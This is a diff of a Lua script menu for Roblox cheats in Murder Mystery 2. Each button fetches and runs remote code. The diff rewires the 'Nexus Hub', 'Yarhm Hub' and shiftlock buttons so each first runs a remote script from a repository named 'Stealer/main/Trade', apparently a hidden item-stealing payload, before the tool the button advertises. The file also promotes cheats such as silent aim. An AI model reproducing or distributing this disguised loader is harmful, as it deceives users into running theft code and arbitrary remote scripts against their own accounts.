@@ -3,35 +3,13 @@ local DrRayLibrary =
 local window = DrRayLibrary:Load("MM2 OOF Hub", "Default")
 local tab = DrRayLibrary.newTab("Scripts", "ImageIdHere")
 
-tab.newButton(
-    "Symphony Hub",
-    "Status: 🟢 Around 25 seconds to load but it's alr ^^",
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/SymphonyHub-/main/Keyless", true))()
-    end
-)
-
-tab.newButton(
-    "R3TH PRIV",
-    "Status: 🟢 This is the smoothest but it has no Silent aim ):<",
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/R3TH-PRIV/main/Hub", true))()
-    end
-)
 
 tab.newButton(
     "Nexus Hub",
-    "Status: 🟢 Silent Aim Fixed! :D",
+    "Status: 🟢 Silent Not working :/",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/NexusHub/main/V3"))()
-    end
-)
-
-tab.newButton(
-    "Highlight Hub",
-    "Status: 🟢 Key: hlvipcomingsoon",
-    function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Highlight-Hub/main/Key", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
     end
 )
 
@@ -39,7 +17,9 @@ tab.newButton(
     "Yarhm Hub",
     "Status: 🟢 This is Keyless! ^^",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Yarhm-Hub/main/Keyless", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-YARHM-12403"))()
+
     end
 )
 
@@ -53,11 +33,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/
 )
 
 tab.newButton(
-    "Movable Shiftlock",
+    "Movable and Permanent shiftlock",
     "Status: 🟢 Also working in any game!",
     function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade", true))()
-        -- OPEN SOURCE 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tadash-10/Stealer/main/Trade"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Unknownproooolucky/Unknown-Hub-X-Universal-Games/main/Universal/Permanent-Shiftlock-V2'))()
     end
 )
